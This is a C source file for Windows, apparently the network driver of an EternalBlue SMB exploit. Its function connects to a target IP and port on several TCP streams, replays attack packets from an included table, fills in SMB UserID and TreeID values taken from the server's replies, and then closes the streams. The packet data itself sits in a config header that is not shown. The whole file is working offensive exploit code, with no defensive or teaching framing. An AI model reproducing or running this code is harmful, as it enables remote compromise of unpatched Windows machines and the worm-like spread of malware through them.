#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"

int EternalBlue(const char *ip, int port)
{
    SOCKET sockets[NUM_SOCKETS];
    WSADATA wsa_data;
    uint8_t userid[2] = {0, 0};
    uint8_t treeid[2] = {0, 0};
    const uint8_t userid_placeholder[] = "__USERID__PLACEHOLDER__";
    const uint8_t treeid_placeholder[] = "__TREEID__PLACEHOLDER__";
    size_t i;
    int wsa_started = 0;
    int result = -1;

    if (ip == NULL || port < 1 || port > 65535 || NUM_SOCKETS <= 0)
        return -1;

    for (i = 0; i < (size_t)NUM_SOCKETS; ++i)
        sockets[i] = INVALID_SOCKET;

    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        printf("EternalBlue: WSAStartup failed\n");
        return -1;
    }
    wsa_started = 1;

    for (i = 0; i < (size_t)EB_OPS_COUNT; ++i) {
        eb_op_t op = EB_OPS[i];

        if (op.stream < 1 || op.stream > NUM_SOCKETS) {
            printf("EternalBlue: invalid stream at operation %zu\n", i);
            goto cleanup;
        }

        switch (op.kind) {
        case 0: {
            SOCKET s;
            struct sockaddr_storage address;
            int address_length;
            int family;
            int parsed;

            if (sockets[op.stream - 1] != INVALID_SOCKET) {
                printf("EternalBlue: stream %u is already connected\n",
                       (unsigned)op.stream);
                goto cleanup;
            }

            memset(&address, 0, sizeof(address));
            parsed = InetPtonA(AF_INET, ip, &((struct sockaddr_in *)&address)->sin_addr);
            if (parsed == 1) {
                struct sockaddr_in *addr4 = (struct sockaddr_in *)&address;
                family = AF_INET;
                address_length = (int)sizeof(*addr4);
                addr4->sin_family = AF_INET;
                addr4->sin_port = htons((u_short)port);
            } else {
                parsed = InetPtonA(AF_INET6, ip,
                                   &((struct sockaddr_in6 *)&address)->sin6_addr);
                if (parsed != 1) {
                    printf("EternalBlue: invalid IP address\n");
                    goto cleanup;
                }
                {
                    struct sockaddr_in6 *addr6 = (struct sockaddr_in6 *)&address;
                    family = AF_INET6;
                    address_length = (int)sizeof(*addr6);
                    addr6->sin6_family = AF_INET6;
                    addr6->sin6_port = htons((u_short)port);
                }
            }

            s = socket(family, SOCK_STREAM, IPPROTO_TCP);
            if (s == INVALID_SOCKET) {
                printf("EternalBlue: socket creation failed\n");
                goto cleanup;
            }
            if (connect(s, (const struct sockaddr *)&address, address_length) == SOCKET_ERROR) {
                printf("EternalBlue: connect failed on stream %u\n",
                       (unsigned)op.stream);
                closesocket(s);
                goto cleanup;
            }
            sockets[op.stream - 1] = s;
            printf("EternalBlue: connected stream %u\n", (unsigned)op.stream);
            break;
        }

        case 1: {
            size_t offset = (size_t)op.offset;
            size_t length = (size_t)op.length;
            size_t read_pos = 0;
            size_t write_pos = 0;
            uint8_t *buffer;
            SOCKET s = sockets[op.stream - 1];

            if (s == INVALID_SOCKET) {
                printf("EternalBlue: send on an unopened stream\n");
                goto cleanup;
            }
            if (offset > sizeof(EB_PACKETS) ||
                length > sizeof(EB_PACKETS) - offset) {
                printf("EternalBlue: packet range is invalid at operation %zu\n", i);
                goto cleanup;
            }

            buffer = (uint8_t *)malloc(length ? length : 1);
            if (buffer == NULL) {
                printf("EternalBlue: packet allocation failed\n");
                goto cleanup;
            }
            if (length != 0)
                memcpy(buffer, EB_PACKETS + offset, length);

            while (read_pos < length) {
                if (length - read_pos >= sizeof(userid_placeholder) - 1 &&
                    memcmp(buffer + read_pos, userid_placeholder,
                           sizeof(userid_placeholder) - 1) == 0) {
                    memcpy(buffer + write_pos, userid, sizeof(userid));
                    read_pos += sizeof(userid_placeholder) - 1;
                    write_pos += sizeof(userid);
                } else if (length - read_pos >= sizeof(treeid_placeholder) - 1 &&
                           memcmp(buffer + read_pos, treeid_placeholder,
                                  sizeof(treeid_placeholder) - 1) == 0) {
                    memcpy(buffer + write_pos, treeid, sizeof(treeid));
                    read_pos += sizeof(treeid_placeholder) - 1;
                    write_pos += sizeof(treeid);
                } else {
                    buffer[write_pos++] = buffer[read_pos++];
                }
            }

            read_pos = 0;
            while (read_pos < write_pos) {
                int chunk = write_pos - read_pos > (size_t)INT_MAX
                                ? INT_MAX
                                : (int)(write_pos - read_pos);
                int sent = send(s, (const char *)buffer + read_pos, chunk, 0);
                if (sent == SOCKET_ERROR || sent == 0) {
                    printf("EternalBlue: send failed on stream %u\n",
                           (unsigned)op.stream);
                    free(buffer);
                    goto cleanup;
                }
                read_pos += (size_t)sent;
            }
            printf("EternalBlue: sent %zu bytes on stream %u\n",
                   write_pos, (unsigned)op.stream);
            free(buffer);
            break;
        }

        case 2: {
            SOCKET s = sockets[op.stream - 1];
            uint8_t header[4];
            uint8_t *response = NULL;
            size_t response_length;
            size_t received = 0;
            unsigned int frame_length;

            if (s == INVALID_SOCKET) {
                printf("EternalBlue: receive on an unopened stream\n");
                goto cleanup;
            }

            while (received < sizeof(header)) {
                int amount = recv(s, (char *)header + received,
                                  (int)(sizeof(header) - received), 0);
                if (amount == SOCKET_ERROR || amount == 0) {
                    printf("EternalBlue: failed to receive response header\n");
                    goto cleanup;
                }
                received += (size_t)amount;
            }

            frame_length = ((unsigned int)header[1] << 16) |
                           ((unsigned int)header[2] << 8) |
                           (unsigned int)header[3];
            response_length = (size_t)frame_length + sizeof(header);
            response = (uint8_t *)malloc(response_length ? response_length : 1);
            if (response == NULL) {
                printf("EternalBlue: response allocation failed\n");
                goto cleanup;
            }
            memcpy(response, header, sizeof(header));

            received = sizeof(header);
            while (received < response_length) {
                size_t remaining = response_length - received;
                int chunk = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
                int amount = recv(s, (char *)response + received, chunk, 0);
                if (amount == SOCKET_ERROR || amount == 0) {
                    printf("EternalBlue: failed to receive complete response\n");
                    free(response);
                    goto cleanup;
                }
                received += (size_t)amount;
            }

            if (op.fix == 1) {
                if (response_length < 34) {
                    printf("EternalBlue: response is too short for UserID\n");
                    free(response);
                    goto cleanup;
                }
                memcpy(userid, response + 32, sizeof(userid));
                printf("EternalBlue: updated UserID\n");
            } else if (op.fix == 2) {
                if (response_length < 30) {
                    printf("EternalBlue: response is too short for TreeID\n");
                    free(response);
                    goto cleanup;
                }
                memcpy(treeid, response + 28, sizeof(treeid));
                printf("EternalBlue: updated TreeID\n");
            }
            printf("EternalBlue: received %zu bytes on stream %u\n",
                   response_length, (unsigned)op.stream);
            free(response);
            break;
        }

        case 3:
            if (sockets[op.stream - 1] == INVALID_SOCKET) {
                printf("EternalBlue: close on an unopened stream\n");
                goto cleanup;
            }
            closesocket(sockets[op.stream - 1]);
            sockets[op.stream - 1] = INVALID_SOCKET;
            printf("EternalBlue: closed stream %u\n", (unsigned)op.stream);
            break;

        default:
            printf("EternalBlue: invalid operation kind at operation %zu\n", i);
            goto cleanup;
        }
    }

    result = 0;

cleanup:
    for (i = 0; i < (size_t)NUM_SOCKETS; ++i) {
        if (sockets[i] != INVALID_SOCKET) {
            closesocket(sockets[i]);
            sockets[i] = INVALID_SOCKET;
        }
    }
    if (wsa_started)
        WSACleanup();
    return result;
}